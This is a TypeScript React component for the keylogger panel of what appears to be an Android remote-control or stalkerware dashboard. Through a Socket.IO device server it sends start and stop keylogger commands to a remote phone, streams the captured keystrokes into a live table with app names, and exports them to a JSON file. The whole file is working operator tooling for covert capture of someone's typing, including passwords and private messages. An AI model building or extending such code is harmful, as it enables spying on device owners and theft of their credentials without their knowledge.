"use client";

import { AndroidDevice, KeyloggerEntry } from "@/types";
import { useState, useEffect, useRef, useCallback } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { 
  Keyboard, Play, Square, Loader2, Search, X, 
  Package, Type, Clock, Download
} from "lucide-react";
import { format, formatDistanceToNow } from "date-fns";
import { io, Socket } from "socket.io-client";
import { useLicenseId } from "@/lib/utils/use-license-id";

interface KeyloggerProps {
  device: AndroidDevice;
}

export default function Keylogger({ device }: KeyloggerProps) {
  const licenseId = useLicenseId(); // Available for future REST API calls if needed
  const [entries, setEntries] = useState<KeyloggerEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [isActive, setIsActive] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [lastUpdateTime, setLastUpdateTime] = useState<Date | null>(null);
  const socketRef = useRef<Socket | null>(null);
  const entriesEndRef = useRef<HTMLDivElement>(null);
  const entryIdCounter = useRef(0);
  
  const DEVICE_SERVER_URL = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";

  // Filter entries based on search query
  const filteredEntries = entries.filter((entry) => {
    if (!searchQuery.trim()) return true;
    const query = searchQuery.toLowerCase();
    return (
      entry.type.toLowerCase().includes(query) ||
      entry.text.toLowerCase().includes(query) ||
      entry.package_name.toLowerCase().includes(query) ||
      (entry.app_name && entry.app_name.toLowerCase().includes(query))
    );
  });

  // Setup Socket.IO connection
  useEffect(() => {
    console.log(`🔌 [Keylogger] Setting up socket for device: ${device.id}`);
    
    if (!socketRef.current) {
      const socket = io(DEVICE_SERVER_URL, {
        transports: ["websocket", "polling"],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: Infinity,
      });

      socket.on("connect", () => {
        console.log("✅ Keylogger connected to device-server.js");
      });

      socket.on("disconnect", () => {
        console.log("❌ Keylogger disconnected from device-server.js");
      });

      socketRef.current = socket;
    }

    const socket = socketRef.current;
    socket.off("device_event");
    socket.off("command-error");
    socket.off("command-sent");

    // Listen for keylogger-result events
    socket.on("device_event", (event: any) => {
      // Debug: Log all device events for this device
      if (event.device_id === device.id) {
        console.log("📥 [Keylogger] Received device_event:", {
          event: event.event,
          device_id: event.device_id,
          expected_device_id: device.id,
          has_data: !!event.data,
          data_type: typeof event.data,
          data_keys: event.data && typeof event.data === "object" ? Object.keys(event.data) : "N/A"
        });
      }
      
      if (event.event === "keylogger_result" && event.device_id === device.id) {
        console.log("✅ [Keylogger] MATCHED keylogger_result event!");
        console.log("📥 [Keylogger] Full event object:", JSON.stringify(event, null, 2));
        console.log("📥 [Keylogger] Event data:", event.data);
        console.log("📥 [Keylogger] Event data type:", typeof event.data);
        console.log("📥 [Keylogger] Is array:", Array.isArray(event.data));
        
        if (event.data) {
          // Handle both single entry and array of entries
          let newEntries: any[] = [];
          
          if (Array.isArray(event.data)) {
            // Direct array format: [{type, text, package_name, timestamp}, ...]
            newEntries = event.data;
          } else if (event.data.entries && Array.isArray(event.data.entries)) {
            // Wrapped format: { entries: [...] }
            newEntries = event.data.entries;
          } else if (event.data.data && Array.isArray(event.data.data)) {
            // Alternative format: { data: [...] }
            newEntries = event.data.data;
          } else if (event.data.items && Array.isArray(event.data.items)) {
            // Alternative format: { items: [...] }
            newEntries = event.data.items;
          } else if (typeof event.data === "object") {
            // Single entry object - check if it has the required fields
            if (event.data.type !== undefined || event.data.text !== undefined || event.data.package_name !== undefined) {
              newEntries = [event.data];
            } else {
              // Try to extract from nested structure
              console.warn("⚠️ [Keylogger] Unexpected data structure, attempting to parse:", event.data);
              // If it's an object but not an array, try to treat it as a single entry
              newEntries = [event.data];
            }
          } else {
            console.warn("⚠️ [Keylogger] Unknown data format:", typeof event.data, event.data);
            setLoading(false);
            return;
          }

          console.log("📥 [Keylogger] Extracted entries count:", newEntries.length);

          // Transform and add entries
          const transformedEntries: KeyloggerEntry[] = newEntries.map((entry: any, index: number) => {
            entryIdCounter.current += 1;
            
            // Handle various field name variations
            const entryType = entry.type || entry.event_type || entry.eventType || "unknown";
            const entryText = entry.text || entry.key || entry.value || entry.content || "";
            const entryPackage = entry.package_name || entry.package || entry.packageName || "";
            const entryAppName = entry.app_name || entry.appName || entry.app || "";
            const entryTimestamp = entry.timestamp || entry.time || entry.date || event.timestamp || new Date().toISOString();
            
            // Generate unique ID
            const entryId = entry.id || `keylog-${entryIdCounter.current}-${Date.now()}-${index}`;
            
            console.log(`📥 [Keylogger] Entry ${index}:`, {
              id: entryId,
              type: entryType,
              text: entryText.substring(0, 50) + (entryText.length > 50 ? "..." : ""),
              package_name: entryPackage,
              app_name: entryAppName,
              timestamp: entryTimestamp
            });
            
            return {
              id: entryId,
              type: String(entryType),
              text: String(entryText),
              package_name: String(entryPackage),
              app_name: entryAppName ? String(entryAppName) : undefined,
              timestamp: String(entryTimestamp),
            };
          });

          console.log("📥 [Keylogger] Transformed entries:", transformedEntries.length);

          // Add new entries to the list (live rendering)
          setEntries((prev) => {
            // Avoid duplicates by checking id, timestamp, text, and package combination
            const existingKeys = new Set(
              prev.map(e => `${e.id}-${e.timestamp}-${e.text}-${e.package_name}`)
            );
            
            const newUniqueEntries = transformedEntries.filter(e => {
              const key = `${e.id}-${e.timestamp}-${e.text}-${e.package_name}`;
              return !existingKeys.has(key);
            });
            
            console.log("📥 [Keylogger] New unique entries:", newUniqueEntries.length);
            console.log("📥 [Keylogger] Total entries after merge:", prev.length + newUniqueEntries.length);
            
            // Sort by timestamp (newest first)
            const merged = [...prev, ...newUniqueEntries].sort((a, b) => {
              try {
                return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
              } catch {
                return 0;
              }
            });
            
            return merged;
          });

          setLastUpdateTime(new Date());
          setLoading(false);
        } else {
          console.warn("⚠️ [Keylogger] No data in event");
          setLoading(false);
        }
      }
    });

    socket.on("command-error", (error: any) => {
      if (error.deviceId === device.id) {
        setLoading(false);
        setIsActive(false);
        console.error("❌ [Keylogger] Command error:", error);
      }
    });

    socket.on("command-sent", (data: any) => {
      if (data.deviceId === device.id && data.command === "start-keylogger") {
        console.log("✅ [Keylogger] Start command sent successfully");
        setIsActive(true);
        setLoading(false);
      } else if (data.deviceId === device.id && data.command === "stop-keylogger") {
        console.log("✅ [Keylogger] Stop command sent successfully");
        setIsActive(false);
        setLoading(false);
      }
    });

    return () => {
      if (socketRef.current) {
        socketRef.current.off("device_event");
        socketRef.current.off("command-error");
        socketRef.current.off("command-sent");
      }
    };
  }, [device.id, DEVICE_SERVER_URL]);

  // Scroll to bottom when new entries arrive
  useEffect(() => {
    entriesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [entries]);

  const handleStart = useCallback(async () => {
    if (!socketRef.current || !socketRef.current.connected) {
      console.error("❌ [Keylogger] Socket not connected");
      return;
    }

    setLoading(true);
    setEntries([]); // Clear previous entries when starting fresh
    
    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "start-keylogger",
      payload: {},
    });
  }, [device.id]);

  const handleStop = useCallback(async () => {
    if (!socketRef.current || !socketRef.current.connected) {
      console.error("❌ [Keylogger] Socket not connected");
      return;
    }

    setLoading(true);
    
    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "stop-keylogger",
      payload: {},
    });
  }, [device.id]);

  const handleClear = () => {
    setEntries([]);
    setSearchQuery("");
    setLastUpdateTime(null);
  };

  const handleExport = () => {
    if (entries.length === 0) {
      return;
    }

    // Format entries with proper date/time formatting
    const formattedEntries = entries.map((entry) => {
      let formattedDate: string;
      try {
        let date: Date;
        const ts = entry.timestamp;
        
        // Handle Unix timestamp (milliseconds)
        if (typeof ts === 'number' || (typeof ts === 'string' && /^\d+$/.test(ts))) {
          const numTimestamp = typeof ts === 'number' ? ts : parseInt(ts, 10);
          date = numTimestamp.toString().length === 10 
            ? new Date(numTimestamp * 1000) 
            : new Date(numTimestamp);
        } else {
          date = new Date(ts);
        }
        
        if (isNaN(date.getTime())) {
          formattedDate = String(ts);
        } else {
          formattedDate = format(date, "yyyy-MM-dd HH:mm:ss");
        }
      } catch {
        formattedDate = String(entry.timestamp);
      }

      return {
        id: entry.id,
        type: entry.type,
        text: entry.text,
        package_name: entry.package_name,
        app_name: entry.app_name || null,
        timestamp: entry.timestamp,
        formatted_timestamp: formattedDate,
        date: formattedDate.split(' ')[0],
        time: formattedDate.split(' ')[1] || null,
      };
    });

    // Create export data object
    const exportData = {
      device_id: device.id,
      device_name: device.name || device.id,
      export_date: format(new Date(), "yyyy-MM-dd HH:mm:ss"),
      export_timestamp: new Date().toISOString(),
      total_entries: entries.length,
      entries: formattedEntries,
    };

    // Create filename with date and time
    const now = new Date();
    const dateTimeStr = format(now, "yyyy-MM-dd_HH-mm-ss");
    const filename = `keylogger_${device.id}_${dateTimeStr}.json`;

    // Create and download file
    const blob = new Blob([JSON.stringify(exportData, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const formatTimestamp = (timestamp: string | number): string => {
    try {
      let date: Date;
      
      // Handle Unix timestamp (milliseconds) - if it's a number or numeric string
      if (typeof timestamp === 'number' || (typeof timestamp === 'string' && /^\d+$/.test(timestamp))) {
        const numTimestamp = typeof timestamp === 'number' ? timestamp : parseInt(timestamp, 10);
        // Check if it's in seconds (10 digits) or milliseconds (13 digits)
        date = numTimestamp.toString().length === 10 
          ? new Date(numTimestamp * 1000) 
          : new Date(numTimestamp);
      } else {
        // Handle ISO string format
        date = new Date(timestamp);
      }
      
      // Validate date
      if (isNaN(date.getTime())) {
        return String(timestamp);
      }
      
      const now = new Date();
      const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);
      
      // Show relative time for recent entries (within last hour)
      if (diffInSeconds < 60) {
        return "Just now";
      } else if (diffInSeconds < 3600) {
        const minutes = Math.floor(diffInSeconds / 60);
        return `${minutes} minute${minutes !== 1 ? 's' : ''} ago`;
      } else if (diffInSeconds < 86400) {
        const hours = Math.floor(diffInSeconds / 3600);
        return `${hours} hour${hours !== 1 ? 's' : ''} ago`;
      } else {
        // For older entries, show date and time
        const isToday = date.toDateString() === now.toDateString();
        const isYesterday = new Date(now.getTime() - 86400000).toDateString() === date.toDateString();
        
        if (isToday) {
          return `Today ${format(date, "h:mm:ss a")}`;
        } else if (isYesterday) {
          return `Yesterday ${format(date, "h:mm:ss a")}`;
        } else {
          return format(date, "MMM d, yyyy h:mm:ss a");
        }
      }
    } catch {
      return String(timestamp);
    }
  };

  return (
    <div className="flex flex-col h-full bg-background">
      {/* Header */}
      <div className="flex-shrink-0 border-b bg-card/50 backdrop-blur-sm p-4 space-y-3">
        {/* Top Row: Title and Actions */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-primary/10">
              <Keyboard className="h-5 w-5 text-primary" />
            </div>
            <div>
              <h2 className="text-lg font-semibold">Keylogger</h2>
              <p className="text-xs text-muted-foreground">
                {entries.length > 0 ? `${entries.length} entries captured` : "No entries"}
                {isActive && (
                  <Badge variant="outline" className="ml-2 bg-green-500/10 text-green-700 dark:text-green-400 border-green-500/20">
                    Active
                  </Badge>
                )}
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {!isActive ? (
              <Button
                onClick={handleStart}
                size="sm"
                disabled={loading || device.status !== "online"}
                className="gap-2"
              >
                {loading ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <Play className="h-4 w-4" />
                )}
                Start
              </Button>
            ) : (
              <Button
                onClick={handleStop}
                size="sm"
                disabled={loading || device.status !== "online"}
                variant="destructive"
                className="gap-2"
              >
                {loading ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <Square className="h-4 w-4" />
                )}
                Stop
              </Button>
            )}
            {entries.length > 0 && (
              <>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={handleExport}
                  className="gap-2"
                >
                  <Download className="h-4 w-4" />
                  Export
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={handleClear}
                  className="gap-2"
                >
                  <X className="h-4 w-4" />
                  Clear
                </Button>
              </>
            )}
          </div>
        </div>

        {/* Search Bar */}
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            type="text"
            placeholder="Search by type, text, or package name..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="pl-9 pr-9"
          />
          {searchQuery && (
            <Button
              variant="ghost"
              size="icon"
              className="absolute right-1 top-1/2 -translate-y-1/2 h-7 w-7"
              onClick={() => setSearchQuery("")}
            >
              <X className="h-3 w-3" />
            </Button>
          )}
        </div>
      </div>

      {/* Data Grid */}
      <div className="flex-1 overflow-y-auto min-h-0">
        {device.status !== "online" ? (
          <div className="flex flex-col items-center justify-center h-full text-center p-8">
            <div className="p-4 rounded-full bg-muted mb-4">
              <Keyboard className="h-12 w-12 text-muted-foreground" />
            </div>
            <p className="text-lg font-medium mb-2">Device is offline</p>
            <p className="text-sm text-muted-foreground">Connect device to start keylogger</p>
          </div>
        ) : filteredEntries.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-full text-center p-8">
            <div className="p-4 rounded-full bg-muted mb-4">
              <Keyboard className="h-12 w-12 text-muted-foreground" />
            </div>
            <p className="text-lg font-medium mb-2">
              {searchQuery ? "No entries found" : isActive ? "Waiting for keystrokes..." : "No entries captured"}
            </p>
            {searchQuery ? (
              <p className="text-sm text-muted-foreground">Try a different search term</p>
            ) : !isActive ? (
              <p className="text-sm text-muted-foreground">Click Start to begin capturing keystrokes</p>
            ) : (
              <p className="text-sm text-muted-foreground">Keystrokes will appear here in real-time</p>
            )}
          </div>
        ) : (
          <div className="p-4">
            {/* Table Header */}
            <div className="grid grid-cols-12 gap-4 p-3 bg-muted/50 rounded-lg mb-2 font-semibold text-sm sticky top-0 z-10">
              <div className="col-span-2 flex items-center gap-2">
                <Type className="h-4 w-4 text-muted-foreground" />
                Type
              </div>
              <div className="col-span-3 flex items-center gap-2">
                <Keyboard className="h-4 w-4 text-muted-foreground" />
                Text
              </div>
              <div className="col-span-3 flex items-center gap-2">
                <Package className="h-4 w-4 text-muted-foreground" />
                App Name
              </div>
              <div className="col-span-2 flex items-center gap-2">
                <Package className="h-4 w-4 text-muted-foreground" />
                Package
              </div>
              <div className="col-span-2 flex items-center gap-2">
                <Clock className="h-4 w-4 text-muted-foreground" />
                Timestamp
              </div>
            </div>

            {/* Table Rows */}
            <div className="space-y-1">
              {filteredEntries.map((entry) => (
                <div
                  key={entry.id}
                  className="grid grid-cols-12 gap-4 p-3 bg-card/50 hover:bg-card border border-border/50 rounded-lg transition-colors"
                >
                  <div className="col-span-2 flex items-center">
                    <Badge variant="outline" className="text-xs">
                      {entry.type}
                    </Badge>
                  </div>
                  <div className="col-span-3 flex items-center min-w-0">
                    <span className="text-sm font-mono break-words w-full">
                      {entry.text ? (
                        <span className="break-all">{entry.text}</span>
                      ) : (
                        <span className="text-muted-foreground italic">(empty)</span>
                      )}
                    </span>
                  </div>
                  <div className="col-span-3 flex items-center min-w-0">
                    <span className="text-sm truncate w-full" title={entry.app_name || entry.package_name}>
                      {entry.app_name ? (
                        <span className="font-medium">{entry.app_name}</span>
                      ) : entry.package_name ? (
                        <span className="text-muted-foreground">{entry.package_name}</span>
                      ) : (
                        <span className="text-muted-foreground italic">(unknown)</span>
                      )}
                    </span>
                  </div>
                  <div className="col-span-2 flex items-center min-w-0">
                    <span className="text-xs text-muted-foreground truncate w-full" title={entry.package_name}>
                      {entry.package_name ? (
                        entry.package_name
                      ) : (
                        <span className="italic">(unknown)</span>
                      )}
                    </span>
                  </div>
                  <div className="col-span-2 flex items-center">
                    <span 
                      className="text-xs text-muted-foreground"
                      title={(() => {
                        try {
                          let date: Date;
                          const ts = entry.timestamp;
                          
                          // Handle Unix timestamp (milliseconds)
                          if (typeof ts === 'number' || (typeof ts === 'string' && /^\d+$/.test(ts))) {
                            const numTimestamp = typeof ts === 'number' ? ts : parseInt(ts, 10);
                            date = numTimestamp.toString().length === 10 
                              ? new Date(numTimestamp * 1000) 
                              : new Date(numTimestamp);
                          } else {
                            date = new Date(ts);
                          }
                          
                          if (isNaN(date.getTime())) {
                            return String(ts);
                          }
                          
                          return format(date, "MMMM d, yyyy 'at' h:mm:ss a");
                        } catch {
                          return String(entry.timestamp);
                        }
                      })()}
                    >
                      {formatTimestamp(entry.timestamp)}
                    </span>
                  </div>
                </div>
              ))}
            </div>
            <div ref={entriesEndRef} />
          </div>
        )}
      </div>

      {/* Footer Stats */}
      {entries.length > 0 && (
        <div className="flex-shrink-0 border-t bg-card/50 backdrop-blur-sm p-4">
          <div className="flex items-center justify-between text-sm text-muted-foreground">
            <div>
              Showing <span className="font-medium text-foreground">{filteredEntries.length}</span> of{" "}
              <span className="font-medium text-foreground">{entries.length}</span> entries
            </div>
            {isActive && (
              <div className="flex items-center gap-2">
                <div className="h-2 w-2 rounded-full bg-green-500 animate-pulse" />
                <span className="text-green-600 dark:text-green-400">Recording...</span>
                {lastUpdateTime && (
                  <span className="text-xs text-muted-foreground">
                    Last update: {formatDistanceToNow(lastUpdateTime, { addSuffix: true })}
                  </span>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

